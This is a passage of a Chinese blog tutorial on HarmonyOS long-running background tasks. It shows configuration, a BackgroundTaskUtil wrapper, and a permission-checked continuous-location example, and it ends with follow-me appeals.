<p>在module.json5配置文件中为需要使用长时任务的UIAbility声明相应的长时任务类型（配置文件中填写长时任务类型的<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Fdoc%2Fharmonyos-guides-V13%2Fcontinuous-task-V13%23%25E4%25BD%25BF%25E7%2594%25A8%25E5%259C%25BA%25E6%2599%25AF" title="https://developer.huawei.com/consumer/cn/doc/harmonyos-guides-V13/continuous-task-V13#%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF" target="_blank" ref="nofollow noopener noreferrer">配置项</a>）。</p>
<pre><code class="hljs language-json" lang="json"> <span class="hljs-attr">"module"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
     <span class="hljs-attr">"abilities"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
         <span class="hljs-punctuation">{</span>
        			<span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"EntryAbility"</span><span class="hljs-punctuation">,</span>
          		 <span class="hljs-comment">// ...</span>
              <span class="hljs-comment">// ...</span>
              <span class="hljs-comment">// </span>
              <span class="hljs-attr">"backgroundModes"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
              	<span class="hljs-comment">// 长时任务类型的配置项</span>
             		<span class="hljs-string">"audioRecording"</span>
               	或者
          			<span class="hljs-string">"location"</span>   ✅
             <span class="hljs-punctuation">]</span>
         <span class="hljs-punctuation">}</span>
     <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
     ...
 <span class="hljs-punctuation">}</span>
</code></pre>
<ol start="3">
<li>创建BackgroundTaskUtil.ets文件封装长短时任务</li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { backgroundTaskManager } <span class="hljs-keyword">from</span> <span class="hljs-string">'@kit.BackgroundTasksKit'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">BusinessError</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@kit.BasicServicesKit'</span>;
<span class="hljs-keyword">import</span> { common, <span class="hljs-title class_">WantAgent</span>, wantAgent } <span class="hljs-keyword">from</span> <span class="hljs-string">'@kit.AbilityKit'</span>;

<span class="hljs-keyword">class</span> <span class="hljs-title class_">BackgroundTaskUtil</span> {

  <span class="hljs-comment">// 长任务-开启</span>
  <span class="hljs-title function_">startLongTask</span>(<span class="hljs-params">list:<span class="hljs-built_in">string</span>[], callback: () =&gt; <span class="hljs-built_in">void</span></span>) {  <span class="hljs-comment">// list任务类型， callback开启成功后走的回调</span>
    <span class="hljs-keyword">let</span> <span class="hljs-attr">wantAgentInfo</span>: wantAgent.<span class="hljs-property">WantAgentInfo</span> = {
      <span class="hljs-comment">// 点击通知后，将要执行的动作列表</span>
      <span class="hljs-comment">// 添加需要被拉起应用的bundleName和abilityName</span>
      <span class="hljs-attr">wants</span>: [
        {
          <span class="hljs-attr">bundleName</span>: (<span class="hljs-title function_">getContext</span>() <span class="hljs-keyword">as</span> common.<span class="hljs-property">UIAbilityContext</span>).<span class="hljs-property">abilityInfo</span>.<span class="hljs-property">bundleName</span>,
          <span class="hljs-attr">abilityName</span>: <span class="hljs-string">"EntryAbility"</span>
        }
      ],
      <span class="hljs-comment">// 指定点击通知栏消息后的动作是拉起ability</span>
      <span class="hljs-attr">actionType</span>: wantAgent.<span class="hljs-property">OperationType</span>.<span class="hljs-property">START_ABILITY</span>,
      <span class="hljs-comment">// 使用者自定义的一个私有值</span>
      <span class="hljs-attr">requestCode</span>: <span class="hljs-number">0</span>,
      <span class="hljs-comment">// 点击通知后，动作执行属性</span>
      <span class="hljs-attr">actionFlags</span>: [wantAgent.<span class="hljs-property">WantAgentFlags</span>.<span class="hljs-property">UPDATE_PRESENT_FLAG</span>],
      <span class="hljs-comment">// 车钥匙长时任务子类型。只有申请bluetoothInteraction类型的长时任务，车钥匙子类型才能生效。</span>
      <span class="hljs-comment">// 确保extraInfo参数中的Key值为backgroundTaskManager.BackgroundModeType.SUB_MODE，否则子类型不生效。</span>
      <span class="hljs-comment">// extraInfo: { [backgroundTaskManager.BackgroundModeType.SUB_MODE] : backgroundTaskManager.BackgroundSubMode.CAR_KEY }</span>
    };

    <span class="hljs-keyword">try</span> {
      <span class="hljs-comment">// 通过wantAgent模块下getWantAgent方法获取WantAgent对象</span>
      wantAgent.<span class="hljs-title function_">getWantAgent</span>(wantAgentInfo).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">wantAgentObj: WantAgent</span>) =&gt;</span> {
        <span class="hljs-keyword">try</span> {
          <span class="hljs-comment">// let list: Array&lt;string&gt; = ["audioRecording"];</span>
          <span class="hljs-comment">// let list: Array&lt;string&gt; = ["bluetoothInteraction"]; 长时任务类型包含bluetoothInteraction，CAR_KEY子类型合法</span>
          backgroundTaskManager.<span class="hljs-title function_">startBackgroundRunning</span>(<span class="hljs-title function_">getContext</span>(), list, wantAgentObj).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">res: backgroundTaskManager.ContinuousTaskNotification</span>) =&gt;</span> {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">info</span>(<span class="hljs-string">"Operation startBackgroundRunning succeeded"</span>);
            <span class="hljs-comment">// 此处执行具体的长时任务逻辑，如录音，录制等。</span>
            <span class="hljs-comment">// 写尝试任务</span>
            <span class="hljs-title function_">callback</span>()
          }).<span class="hljs-keyword">catch</span>(<span class="hljs-function">(<span class="hljs-params">error: BusinessError</span>) =&gt;</span> {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`Failed to Operation startBackgroundRunning. code is <span class="hljs-subst">${error.code}</span> message is <span class="hljs-subst">${error.message}</span>`</span>);
          });
        } <span class="hljs-keyword">catch</span> (error) {
          <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`Failed to Operation startBackgroundRunning. code is <span class="hljs-subst">${(error <span class="hljs-keyword">as</span> BusinessError).code}</span> message is <span class="hljs-subst">${(error <span class="hljs-keyword">as</span> BusinessError).message}</span>`</span>);
        }
      });
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`Failed to Operation getWantAgent. code is <span class="hljs-subst">${(error <span class="hljs-keyword">as</span> BusinessError).code}</span> message is <span class="hljs-subst">${(error <span class="hljs-keyword">as</span> BusinessError).message}</span>`</span>);
    }

  }
  <span class="hljs-comment">// 长任务-关闭</span>
  <span class="hljs-title function_">stopLongTask</span>(<span class="hljs-params"/>) {
    backgroundTaskManager.<span class="hljs-title function_">stopBackgroundRunning</span>(<span class="hljs-title function_">getContext</span>()).<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">info</span>(<span class="hljs-string">`Succeeded in operationing stopBackgroundRunning.`</span>);
    }).<span class="hljs-keyword">catch</span>(<span class="hljs-function">(<span class="hljs-params">err: BusinessError</span>) =&gt;</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`Failed to operation stopBackgroundRunning. Code is <span class="hljs-subst">${err.code}</span>, message is <span class="hljs-subst">${err.message}</span>`</span>);
    });
  }

  <span class="hljs-comment">// 短任务-开启</span>
  <span class="hljs-comment">// 短任务-关闭</span>
}

<span class="hljs-keyword">export</span>  <span class="hljs-keyword">const</span> backgroundTaskUtil = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BackgroundTaskUtil</span>()
</code></pre>
<ul>
<li>示例代码</li>
</ul>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { geoLocationManager } <span class="hljs-keyword">from</span> <span class="hljs-string">'@kit.LocationKit'</span>;
<span class="hljs-keyword">import</span> { abilityAccessCtrl } <span class="hljs-keyword">from</span> <span class="hljs-string">'@kit.AbilityKit'</span>;
<span class="hljs-keyword">import</span> { permissionUtil } <span class="hljs-keyword">from</span> <span class="hljs-string">'../utils/PermissionUtil'</span>;
<span class="hljs-keyword">import</span> { backgroundTaskUtil } <span class="hljs-keyword">from</span> <span class="hljs-string">'../utils/BackgroundTaskUtil'</span>;

<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">Index</span> {

  <span class="hljs-title function_">locationCallback</span>(<span class="hljs-params">location:geoLocationManager.Location</span>)  {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'locationCallback: data: '</span> + <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(location));
  }

  <span class="hljs-title function_">aboutToDisappear</span>(<span class="hljs-params"/>) {
    geoLocationManager.<span class="hljs-title function_">off</span>(<span class="hljs-string">'locationChange'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">locationCallback</span>);
  }

  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Button</span>(<span class="hljs-string">'获取位置信息'</span>).<span class="hljs-title function_">onClick</span>(<span class="hljs-keyword">async</span> () =&gt; {
      <span class="hljs-comment">// 1 配置文件 申请权限   同时申请ohos.permission.APPROXIMATELY_LOCATION和ohos.permission.LOCATION 获取到精准位置，精准度在米级别。</span>
      <span class="hljs-keyword">const</span> state = <span class="hljs-keyword">await</span> permissionUtil.<span class="hljs-title function_">checkPermissions</span>([<span class="hljs-string">'ohos.permission.APPROXIMATELY_LOCATION'</span>, <span class="hljs-string">'ohos.permission.LOCATION'</span>], <span class="hljs-title function_">getContext</span>());
      <span class="hljs-keyword">if</span> (!state) <span class="hljs-keyword">return</span>

      <span class="hljs-comment">// 2 检查全局开关  开了-继续走，没开-弹出让他授权</span>
      <span class="hljs-keyword">const</span> locationEnabled = geoLocationManager.<span class="hljs-title function_">isLocationEnabled</span>();
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'查看当前全局开关状态：'</span>, locationEnabled)

      <span class="hljs-keyword">if</span> (!locationEnabled) {  <span class="hljs-comment">// 没开</span>
        <span class="hljs-keyword">const</span> <span class="hljs-attr">atManager</span>: abilityAccessCtrl.<span class="hljs-property">AtManager</span> = abilityAccessCtrl.<span class="hljs-title function_">createAtManager</span>();
        <span class="hljs-keyword">const</span> state = <span class="hljs-keyword">await</span> atManager.<span class="hljs-title function_">requestGlobalSwitch</span>(<span class="hljs-title function_">getContext</span>(), abilityAccessCtrl.<span class="hljs-property">SwitchType</span>.<span class="hljs-property">LOCATION</span>)
        <span class="hljs-keyword">if</span> (!state) <span class="hljs-keyword">return</span>  <span class="hljs-comment">// 拉起全局弹出 用户没授权就终止代码执行</span>
      }

      <span class="hljs-comment">// 3. 获取位置信息  经度纬度 【持续定位。多用于导航、运动轨迹、出行等场景。】</span>
      backgroundTaskUtil.<span class="hljs-title function_">startLongTask</span>([<span class="hljs-string">'location'</span>], <span class="hljs-function">() =&gt;</span> {
        geoLocationManager.<span class="hljs-title function_">on</span>(<span class="hljs-string">'locationChange'</span>, {
          <span class="hljs-attr">interval</span>: <span class="hljs-number">1</span>,
          <span class="hljs-attr">locationScenario</span>: geoLocationManager.<span class="hljs-property">UserActivityScenario</span>.<span class="hljs-property">NAVIGATION</span>
        }, <span class="hljs-variable language_">this</span>.<span class="hljs-property">locationCallback</span>);
      })
      <span class="hljs-comment">// .....</span>
    })
  }
}
</code></pre>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Ftraining%2FclassDetail%2F0a0a956faec348ddaa9b2676a3f19545%3Ftype%3D1%3Fha_source%3Dhmosclass%26ha_sourceId%3D89000248" title="https://developer.huawei.com/consumer/cn/training/classDetail/0a0a956faec348ddaa9b2676a3f19545?type=1?ha_source=hmosclass&amp;ha_sourceId=89000248" target="_blank" ref="nofollow noopener noreferrer">鸿蒙开发者班级</a></p>
<p>✨家人们点个juejin账号关注，会持续发布大前端领域技术文章💕 🍃</p>
<p>✨家人们点个juejin账号关注，会持续发布大前端领域技术文章💕 🍃</p>
<p>✨家人们点个juejin账号关注，会持续发布大前端领域技术文章💕 🍃</p>
<p>    ^_^ 点关注、不迷路、主播带你学技术 (๑′ᴗ‵๑)Ｉ Lᵒᵛᵉᵧₒᵤ❤</p>
<p>​</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>